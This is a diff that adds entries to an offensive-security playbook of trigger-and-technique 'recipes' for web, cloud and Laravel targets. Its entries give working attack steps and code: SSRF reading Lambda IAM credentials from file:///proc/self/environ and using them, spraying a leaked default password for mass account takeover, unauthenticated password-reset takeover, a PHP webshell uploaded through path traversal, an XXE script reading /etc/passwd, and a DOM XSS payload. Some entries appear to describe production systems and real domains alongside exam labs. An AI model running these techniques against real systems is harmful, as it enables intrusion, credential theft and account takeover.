@@ -4,6 +4,37 @@ Scan these triggers during Phase 2/3 entry. If trigger matches → MUST test the
 
 ---
 
+## RECIPE: Forgot Password User Enumeration Oracle
+
+**TRIGGER:** Forgot password endpoint returns "same" success for all emails
+**TECHNIQUE:**
+1. Register your own account, trigger forgot for it
+2. Trigger forgot for a clearly fake email
+3. Compare: raw bytes, content-length, timing, headers, whitespace
+4. Diffs: single vs double space, 2.7s vs 1.1s, extra Set-Cookie, JSON field order
+
+**mock.hackme (June 2026):** "reset your" (exists) vs "reset  your" (fake) — double space oracle.
+
+**EXPECTED YIELD:** User enumeration (Low), enables targeted ATO chains
+
+---
+
+## RECIPE: Same-Endpoint Multi-Action Parameter Collision
+
+**TRIGGER:** Single URL handles multiple actions based on which POST params are present (e.g., /login handles login, forgot, AND change password)
+**TECHNIQUE:**
+1. Map which param combos trigger which action (login=username+password, forgot=forgot_email, reset=hash+change_password)
+2. Send COMBINED params in single request: `forgot_email=victim@x.com&hash=&change_password=New123&change_con_password=New123`
+3. Test if forgot triggers FIRST (setting server state), then change executes in same request
+4. Test if sending login + forgot together leaks different error for existing vs non-existing users
+5. Test race: trigger forgot in request A, immediately send change in request B with same session
+
+**mock.hackme (June 2026):** All three actions routed through POST /login, differentiated by params. Combo didn't bypass but revealed the shared endpoint architecture.
+
+**EXPECTED YIELD:** Logic bypass (High), auth bypass, state confusion
+
+---
+
 ## RECIPE: Prerequisite Skip
 **TRIGGER:** Multi-step flow (KYC, loan, consent, onboarding, payment)
 **TECHNIQUE:**
@@ -89,6 +120,27 @@ Scan these triggers during Phase 2/3 entry. If trigger matches → MUST test the
 6. USE extracted creds to access internal services (don't just report SSRF)
 **EXPECTED YIELD:** Critical (full cloud account access via leaked IAM creds)
 **PROVEN ON:** Standard cloud exploitation chain
+
+### SSRF Sub-Recipe: Lambda file:// Protocol → IAM Creds
+**TRIGGER:** SSRF on AWS Lambda where IMDS (169.254.169.254) is blocked/connection refused
+**TECHNIQUE:**
+1. If `http://169.254.169.254/` returns "Connection refused" → Lambda has IMDSv2 or IMDS disabled
+2. Test `file:///proc/self/environ` — Lambda env vars contain IAM creds as null-separated entries
+3. Parse output for: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`
+4. Also extract: `AWS_LAMBDA_FUNCTION_NAME`, `_HANDLER` (reveals source path)
+5. Read Lambda source: `file:///var/task/lambda_function.py` (or handler path from `_HANDLER`)
+6. Use stolen creds: `aws sts get-caller-identity` → reveals role ARN → enumerate IAM permissions
+```python
+import requests
+r = requests.post("https://target/endpoint",
+    headers={"authorizationToken": "<token>", "Content-Type": "application/json"},
+    json={"fileName": "file:///proc/self/environ"})
+# Parse null-separated env vars from response
+env_vars = r.json()["body"].split("\\x00")
+```
+**KEY INSIGHT:** Python `requests.get("file:///path")` works natively — no special adapter needed. Many SSRF filters block `http://169.254.x.x` but forget `file://` protocol entirely.
+**POST-EXPLOITATION:** After getting IAM creds: `sts get-caller-identity` → role name → `iam list-role-policies` → enumerate what the Lambda can access (S3, DynamoDB, other Lambdas).
+**PROVEN ON:** EvidentCrime (SecOps exam, June 2026) — `/myfiles` endpoint passed `fileName` directly to `requests.get()`. IMDS blocked but `file:///proc/self/environ` leaked full IAM session creds + flag.
 
 ---
 
@@ -178,6 +230,131 @@ Scan these triggers during Phase 2/3 entry. If trigger matches → MUST test the
 
 ---
 
+## Laravel/Inertia/Vue Recipes
+
+### RECIPE: Laravel Parameterized Config Leak → Mass ATO
+**TRIGGER:** Laravel app with `/api/get-params/{type}` or similar parameterized config endpoint
+**TECHNIQUE:**
+1. Enumerate param types: passDefault, PASSWORD, SLA, VERIFIKASI, CATEGORY, STATUS
+2. If passDefault returns a password value → find user list endpoint (`/api/load-user`)
+3. Determine login identifier format (email vs username) from load-user response
+4. Spray default password against all active user emails
+5. Post-auth: check Inertia `data-page` for SIP creds, tokens, internal config
+**EXPECTED YIELD:** Mass ATO (Critical). BlueSpider June 2026: 69/90 prod accounts including Super Admin.
+**KEY LESSON:** username enumeration ≠ login credentials. Always find the EMAIL endpoint separately.
+**CROSS-REF:** `references/laravel-default-password-ato.md`
+
+### RECIPE: Ziggy Route Dump Extraction
+**TRIGGER:** Target returns HTML with `const Ziggy = {...}` or `data-page="{...ziggy...}"` in page source (Laravel + Inertia.js apps).
+**TECHNIQUE:**
+1. View page source of login/register page
+2. Parse the Ziggy JSON — contains ALL named routes with URIs and HTTP methods
+3. Check for `_ignition` routes (debug mode), `sanctum` (API auth), `register` (open registration)
+**EXPECTED YIELD:** Complete authenticated route map without fuzzing. Reveals Ignition debug, Sanctum endpoints, admin panels.
+**EXAMPLE (BlueSpider June 2026):** vkyc.aosgraha.com page source exposed 22 routes including `_ignition/execute-solution` (RCE-capable).
+
+### RECIPE: Laravel JS Bundle API Extraction
+**TRIGGER:** Laravel/Vue/Inertia app with Vite build (`/build/assets/app-*.js`).
+**TECHNIQUE:**
+```bash
+curl -sk "https://target/build/assets/app-*.js" | grep -oE '"/api/[a-zA-Z0-9_/-]{2,80}"' | sort -u
+```
+Then batch-test each endpoint for unauth access (200 without session).
+**EXPECTED YIELD:** 50-100+ API endpoints. Common unauth leaks: user lists, templates, params, config.
+**PITFALL:** Don't use ffuf on rate-limited Laravel targets. If target starts timing out after probing, use manual curl loops with 4s timeout per request instead of bulk fuzzing.
+**EXAMPLE (BlueSpider June 2026):** 83 endpoints extracted, 9 accessible without auth including 166 usernames on prod.
+
+### RECIPE: CORS Wildcard + Unauth API Chain
+**TRIGGER:** API returns `Access-Control-Allow-Origin: *` AND has unauth-accessible endpoints with sensitive data.
+**TECHNIQUE:**
+1. Confirm CORS: `curl -H "Origin: https://evil.com" -D - URL | grep access-control`
+2. Identify unauth endpoints returning PII/user data
+3. Chain: attacker website → fetch() → steal data cross-origin
+**EXPECTED YIELD:** Medium-High (cross-origin data theft enables credential stuffing, social engineering).
+**EXAMPLE:** /api/user-combo-username (130 users) + ACAO:* = any website steals agent roster.
+
+### RECIPE: Ignition Debug Mode Check
+**TRIGGER:** Laravel app (identified by XSRF-TOKEN/laravel_session cookies).
+**TECHNIQUE:**
+1. `GET /_ignition/health-check` — if returns `{"can_execute_commands":true}` → debug mode ON
+2. `POST /_ignition/execute-solution` — test with dummy payload, check for 403 (IP-restricted) vs 500 (exploitable)
+3. If 403: try X-Forwarded-For/X-Real-IP bypass headers
+4. If accessible: use CVE-2021-3129 Ignition RCE chain
+**EXPECTED YIELD:** RCE if execute-solution is reachable. Info disclosure (stack traces, paths) even without RCE.
+
+---
+
+## RECIPE: Spring Boot OpenAPI/Swagger Auth Bypass
+**TRIGGER:** Target is Spring Boot (Istio/Envoy or nginx proxy), API endpoints under `/prefix/api/*` all return 401.
+**TECHNIQUE:**
+1. Test OpenAPI v3 at `/prefix/v3/api-docs` (NOT `/prefix/api/v3/api-docs`)
+2. Test Swagger UI at `/prefix/swagger-ui/index.html` and `/prefix/webjars/swagger-ui/`
+3. Test `/prefix/health` (often whitelisted for K8s liveness probes)
+4. Check `swagger-initializer.js` for `configUrl` → follow to swagger-config
+5. Check swagger-config response for internal hostnames in `oauth2RedirectUrl`
+**EXPECTED YIELD:** Full API spec (95+ endpoints, 130+ schemas), interactive Swagger UI, internal hostname disclosure, DB type via /health.
+**WHY IT WORKS:** Spring Security filter covers `/api/**` but springdoc registers at context root. Istio routes by prefix match — `/prefix/v3/` bypasses `/prefix/api/` auth rule.
+**PROVEN ON:** AltoCMS (June 2026) — `/jago/v3/api-docs` exposed 97KB OpenAPI spec, Swagger UI fully functional, `/jago/health` leaked PostgreSQL + disk info, swagger-config leaked `dashboard-jago.cms.local.alto.id`.
+
+---
+
+## RECIPE: Systematic Unauth Endpoint Testing from OpenAPI Spec
+**TRIGGER:** OpenAPI spec obtained (authenticated or not), all endpoints assumed auth-gated.
+**TECHNIQUE:**
+1. Parse all paths with correct HTTP methods from spec
+2. Test EVERY endpoint with correct method + empty `{}` body
+3. Focus on utility endpoints: `/download/*`, `/cache/*`, `/remove-*`, `/cleanup/*`, `/export/*`
+4. Fire-and-forget endpoints (return "Success" regardless of input) may still perform destructive actions
+5. Test with path traversal payloads on any file-accepting params
+**EXPECTED YIELD:** Unauthenticated access to utility/maintenance endpoints missed by SecurityConfig.
+**PROVEN ON:** AltoCMS (June 2026) — `/api/download/remove-files` was completely unauthenticated despite 94/95 other endpoints properly gated. Accepted file deletion requests without auth.
+**KEY INSIGHT:** Developers forget `@PreAuthorize` on utility endpoints because they're "internal only" — but if the route is registered, it's accessible.
+
+---
+
+## RECIPE: Email Flooding via Forgot-Password (No Rate Limit)
+**TRIGGER:** Forgot-password returns same response (OK-000) for all inputs, no rate limit on login confirmed.
+**TECHNIQUE:**
+1. Send 20+ forgot-password requests for SAME email in rapid succession
+2. If all return OK (200) = each triggers a password reset email
+3. Quantify: measure requests/second sustainable
+4. Note: each new reset invalidates previous tokens (DoS on legitimate reset)
+**EXPECTED YIELD:** Medium — inbox flooding DoS + denial of password reset service + potential token prediction if tokens are sequential.
+**PROVEN ON:** AltoCMS (June 2026) — 20/20 requests succeeded in 4 seconds (5 req/s), zero rate limiting. Confirmed via PoC script.
+
+---
+
+## RECIPE: XHR JSON Bypass on Session-Gated Java Apps
+**TRIGGER:** Java/JBoss/WildFly app with 302 auth redirects on unauthenticated requests. JSP/2.3 in X-Powered-By. JSESSIONID session cookies.
+**TECHNIQUE:**
+1. Send POST with `Content-Type: application/json` + `X-Requested-With: XMLHttpRequest`
+2. Compare: GET returns 302 (auth redirect) vs POST+JSON+XHR returns 400/403/500 JSON
+3. If bypass confirmed → scan ALL auth-gated endpoints with this technique
+4. Look for: endpoints returning 400 with validation errors (process requests without auth)
+5. Check verbose error JSON for `exceptionType`, internal class names, URIs
+```python
+hdrs = {'X-Requested-With':'XMLHttpRequest','Content-Type':'application/json'}
+r = requests.post(f'{base}/protected/path', json={}, headers=hdrs, verify=False, allow_redirects=False)
+# If status != 302 → BYPASS
+```
+**EXPECTED YIELD:** Access control bypass on internal APIs, verbose error disclosure (Java exception classes), unauthenticated access to auth/entitlements endpoints. Medium severity unless credential validation or data access proven.
+**PROVEN ON:** BIFast (June 2026) — ACI UP platform. 8 OAuth/Entitlements endpoints reached via bypass. AuthenticationFactorVerify processed auth requests without session. Java IOException leaked.
+**KEY INSIGHT:** The XmlHttpRequest handler in ACI UP/Java frameworks often has a separate code path that returns JSON errors instead of redirecting. This path may skip session validation entirely.
+
+---
+
+## RECIPE: H2C Upgrade Over TLS
+**TRIGGER:** HTTPS server speaking HTTP/2 (check with `curl --http2`).
+**TECHNIQUE:**
+```bash
+curl -sk -H 'Upgrade: h2c' -H 'Connection: Upgrade' -H 'HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA' -o /dev/null -w '%{http_code}' 'https://target/'
+```
+If 101 Switching Protocols → server accepts H2C cleartext upgrade over TLS (should be rejected).
+**EXPECTED YIELD:** Low standalone. High if reverse proxy in front (H2C smuggling bypasses access controls).
+**PROVEN ON:** BIFast (June 2026) — host 55 returned 101, host 50 did not.
+
+---
+
 ## Usage Protocol
 
 When entering Phase 2/3 on ANY engagement:
@@ -185,6 +362,26 @@ When entering Phase 2/3 on ANY engagement:
 2. For each matching trigger → execute the recipe
 3. If recipe yields a finding → check if it chains with another recipe
 4. Document recipe name in finding for future pattern tracking
+
+---
+
+## RECIPE: Unauth Password Reset → ATO (BlueSpider, June 2026)
+
+**TRIGGER:** Laravel app with `/api/reset-default-password` in JS bundle or route dump. Any `passDefault` param endpoint.
+
+**TECHNIQUE:**
+1. `GET /api/load-user` → extract user IDs + emails (no auth)
+2. `POST /api/reset-default-password {"user_id": <id>}` → resets to system default (no auth)
+3. `GET /sanctum/csrf-cookie` → get fresh XSRF + session cookie
+4. `POST /login` with JSON body + `X-XSRF-TOKEN` header + `Accept: application/json` → HTTP 204 = success
+5. `GET /dashboard` → parse `data-page` attribute for `props.auth.user` (proves identity)
+6. `GET /customer-profile/{id}` → parse `data-page` for `props.cust` (proves PII access)
+
+**YIELD:** Critical ATO. If passDefault API param is null but endpoint returns "Success", server uses hardcoded fallback (test: JAGO1234!, 12345678, Bscrm123!).
+
+**KEY LESSON:** HTTP 204 on login ≠ ATO proof. Must prove: (a) identity via dashboard data-page, (b) victim data access. Without steps 5-6 the finding is "unauth password reset" (High), not "ATO with data access" (Critical).
+
+**INACTIVE USERS:** Login returns 422 for INACTIVE users even with correct password. Always target ACTIVE users from load-user response.
 
 ---
 
@@ -257,6 +454,34 @@ When entering Phase 2/3 on ANY engagement:
 
 ---
 
+## RECIPE: SSH Key Reconstruction from Corrupted/Leaked Sources
+
+**TRIGGER:** SSH private key found on pastebin, git history, or OSINT source but won't load (`invalid format`)
+**TECHNIQUE:**
+1. Download raw key content
+2. Common corruption issues:
+   - CRLF line endings (`\r\n` instead of `\n`) — fix with `sed 's/\r$//'`
+   - Improper base64 line wrapping (OpenSSH requires max 70-char lines)
+   - Character substitution in challenge keys (Cyrillic lookalikes, `|` vs `l`, `0` vs `O`)
+   - Missing/extra newline after header/before footer
+3. Identify key type from header bytes: decode base64, first field = key type string
+4. Reconstruct with proper formatting:
+```bash
+printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----' \
+'<base64 line 1 max 70 chars>' \
+'<base64 line 2>' \
+'-----END OPENSSH PRIVATE KEY-----' > fixed_key
+chmod 600 fixed_key
+ssh-keygen -y -f fixed_key  # Validates + shows public key
+```
+5. Key comment reveals target hint (e.g., `id_rsa_backup_docker` → try Docker SSH ports 2222/2200)
+6. Try ALL live hosts on standard AND non-standard SSH ports (22, 2222, 2200, 8022, 22222)
+**EXPECTED YIELD:** Authenticated access to target host
+**PROVEN ON:** SecOps exam (June 2026) — pastebin ed25519 key with bad line wrapping. Comment `id_rsa_backup_docker` hinted at port 2222. Key worked on Docker container SSH (`172.20.213.9:2222`).
+**KEY INSIGHT:** Always check the key comment (`ssh-keygen -y -f key`) — it often reveals the target service (docker, backup, staging, etc.) and guides port selection.
+
+---
+
 ## Mobile-Specific Recipes (load for mtest Phase 5+)
 
 ### RECIPE: Deeplink Hijacking
@@ -289,6 +514,8 @@ When entering Phase 2/3 on ANY engagement:
 
 ## Web3-Specific Recipes (load for w3hunt)
 
+## Web3-Specific Recipes (load for w3hunt)
+
 ### RECIPE: Role Persistence After Transfer
 **TRIGGER:** NFT/token with role-based access (DAO governance, ENS, admin NFTs)
 **TECHNIQUE:**
@@ -308,3 +535,85 @@ When entering Phase 2/3 on ANY engagement:
 3. Check if unprotected functions can modify critical state
 4. Test: can non-privileged address call admin functions?
 **EXPECTED YIELD:** Privilege escalation (Critical if funds at risk)
+
+---
+
+## RECIPE: Avatar Upload Path Traversal to RCE
+
+**TRIGGER:** File upload stores files in a directory where PHP/script execution is disabled, but parent directory has execution enabled.
+**TECHNIQUE:**
+1. Confirm upload accepts `.php` extension (prepend PNG magic bytes: `\x89PNG\r\n\x1a\n<?php ...?>`)
+2. Check if uploaded files execute — if served as plain text, PHP is disabled in that dir
+3. Test path traversal in filename: `../shell.php`
+4. Access the file in the parent directory where PHP IS enabled
+```bash
+printf '\x89PNG\r\n\x1a\n<?php echo file_get_contents("/etc/flag"); ?>' | \
+curl -sk -b "PHPSESSID=<sess>" -X POST "https://target/upload" \
+  -F "file=@-;filename=../shell.php;type=image/png" -F "submit=Upload"
+```
+5. Check renamed filename on profile page (apps often append random suffix)
+6. Access in parent dir: `https://target/upload-parent/shellXXXXX.php`
+
+**Key notes:**
+- App may rename: `../shell.php` → `../shellRaNdOm.php` (random suffix)
+- PNG magic bytes bypass "valid file format" checks
+- `.htaccess`/`.user.ini` uploads may be blocked by name, but `.php` with traversal is not
+- SecOps June 2026: `public/image/avatar/` had PHP disabled, `public/image/` had it enabled
+
+**EXPECTED YIELD:** RCE via webshell, arbitrary file read (Critical)
+
+---
+
+## RECIPE: Base64-Encoded XML Submission (XXE in SPAs)
+
+**TRIGGER:** SPA/AJAX feature that sends XML as base64-encoded POST parameter. Common in contact forms, country selectors, config loaders. Look for `btoa('<?xml` in JS source.
+**TECHNIQUE:**
+1. Inspect JS for `btoa('<?xml` pattern or base64 POST params
+2. Get CSRF token (same session required for token validity)
+3. Craft XXE and base64-encode:
+```python
+import requests, base64, re
+s = requests.Session()
+s.verify = False
+r = s.get('https://target/endpoint')
+token = re.search(r'value="([A-Za-z0-9_/+=-]{50,})"', r.text).group(1)
+xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+data = base64.b64encode(xxe.encode()).decode()
+r2 = s.post('https://target/endpoint', data={'param': data, 'token': token})
+print(r2.text)
+```
+
+**Key notes:**
+- CSRF token is single-use and session-bound — must GET+POST in same session
+- Also test: `php://filter/convert.base64-encode/resource=/etc/passwd` for binary-safe reads
+- SecOps June 2026: Contact Us iframe sent country as `btoa(xml)`, file content returned in `<address>` field
+
+**EXPECTED YIELD:** Arbitrary file read, SSRF, DoS via billion laughs (High/Critical)
+
+---
+
+## RECIPE: DOM XSS via Client-Side Cipher + innerHTML Sink
+
+**TRIGGER:** App uses `innerHTML` to render input AFTER a client-side transformation (cipher, encoding). If transformation preserves `<>()=;` while scrambling alphanumerics, XSS is achievable.
+**TECHNIQUE:**
+1. Find `innerHTML` assignments in JS source
+2. Trace data flow — identify transformation function between input and sink
+3. Analyze: does it preserve HTML metacharacters `<>()=;/"'`?
+4. Reverse-engineer the cipher to find input that produces valid HTML:
+```python
+# Given substitution cipher extracted from JS
+input_chars  = 'ABCDE...<>;'
+output_chars = '98765...imj'
+def decode(target):
+    return ''.join(input_chars[output_chars.find(c)] if output_chars.find(c)>-1 else c for c in target)
+target = '<img src=x onerror=alert(1)>'
+payload = decode(target)  # Type THIS in the input field
+```
+5. Verify: run encode(payload) in browser console — must produce exact target HTML
+
+**Key notes:**
+- Server-side may HTML-encode the `value` attribute — attack requires typing directly in browser (true DOM-based)
+- SecOps June 2026: xss4 cipher mapped `<` to `i`, `>` to `j` — input `K<;8 ut4=z qp6ttqt=2)6tvMINL` produced `<img src=x onerror=alert(1)>` after encode()
+- General approach: extract encode(), build reverse map, reverse-map your desired XSS payload
+
+**EXPECTED YIELD:** DOM XSS, bypasses server-side encoding (Medium)
